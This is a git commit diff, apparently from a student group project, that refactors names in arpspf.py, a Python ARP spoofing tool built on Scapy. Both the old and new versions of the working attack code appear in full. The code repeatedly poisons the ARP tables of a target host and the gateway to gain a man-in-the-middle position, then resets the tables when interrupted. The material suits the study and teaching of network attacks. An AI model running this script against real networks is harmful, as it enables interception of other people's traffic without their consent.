1687b478fe53c8173ea8f06c4c9500b66db2356e
genaaaaa <2102744@sit.singaporetech.edu.sg>
2022-10-15 16:32:21 +0800

    Update arpspf.py
    changed function names and variables

--- arpspf.py
+++ arpspf.py
@@ -9,27 +9,31 @@ import scapy.all as scapy
 import time
 import pyfiglet
 
+
 # Reset ARP tables back to original values
-def reset(destination_ip, source_ip):
-    print("\n[*] Reseting ARP tables...")
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
-    scapy.send(packet, verbose = False)
+def resetArpTable(destIP, srcIP):
+    print("\n[*] resetting ARP tables...")
+    destMac = getMac(destIP)
+    srcMac = getMac(srcIP)
+    packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMac, psrc=srcIP, hwsrc=srcMac)
+    scapy.send(packet, verbose=False)
+
 
 # To get MAC address of target and router
-def get_mac(ip):
-	arp_req = scapy.ARP(pdst = ip)
-	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-	broadcast_arp_req = broadcast / arp_req
-	reply = scapy.srp(broadcast_arp_req, timeout = 5, verbose = False)[0]
-	return reply[0][1].hwsrc
+def getMac(ip):
+    arpReq = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    broadcast_arpReq = broadcast / arpReq
+    reply = scapy.srp(broadcast_arpReq, timeout=5, verbose=False)[0]
+    return reply[0][1].hwsrc
 
-# Poison Target's and Gateway's ARP tables 
-def spoof(target_ip, spoof_ip):
-	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
-	scapy.send(packet, verbose = False)
-	
+
+# Poison Target's and Gateway's ARP tables
+def spoofARP(targetIP, spoofIP):
+    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=getMac(targetIP), psrc=spoofIP)
+    scapy.send(packet, verbose=False)
+
+
 # Display instructions
 def msg():
     title = pyfiglet.figlet_format("ARP Spoofer")
@@ -38,29 +42,31 @@ def msg():
     print("\n$ python3 arpspf.py <target IP> <gateway IP>")
     print("\nFollow the above format to prevent the error shown below: \n")
 
-# Mitm attack function
+
+# MITM attack function
 def attack():
     try:
         packets_count = 0
-        while True:                             # update ARP tables constantly
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
+        while True:  # update ARP tables constantly
+            spoofARP(targetIP, gatewayIP)
+            spoofARP(gatewayIP, targetIP)
             packets_count += 2
-            print("\r[*]" + str(packets_count) + " packets sent ", end ="")
-            time.sleep(2)                       # 2s wait before updating ARP table again
-    except KeyboardInterrupt:                   # exit program with keyboard interrupt
+            print("\r[*]" + str(packets_count) + " packets sent ", end="")
+            time.sleep(2)  # 2s wait before updating ARP table again
+    except KeyboardInterrupt:  # exit program with keyboard interrupt
         print("\n[!] Exiting ARP Spoofer...")
-        reset(gateway_ip, target_ip)
-        reset(target_ip, gateway_ip)
+        resetArpTable(gatewayIP, targetIP)
+        resetArpTable(targetIP, gatewayIP)
         print("\n[+] ARP tables have been reset.")
         print("\n[+] Arp Spoof Stopped\n")
         print("\n[+] Arp Spoof Stopped")
-        bye = pyfiglet.figlet_format("P2 Group 13", font = "digital" )
+        bye = pyfiglet.figlet_format("P2 Group 13", font="digital")
         print(bye)
+
 
 if __name__ == '__main__':
     if len(sys.argv) != 3:
         msg()
-    target_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
+    targetIP = sys.argv[1]
+    gatewayIP = sys.argv[2]
     attack()
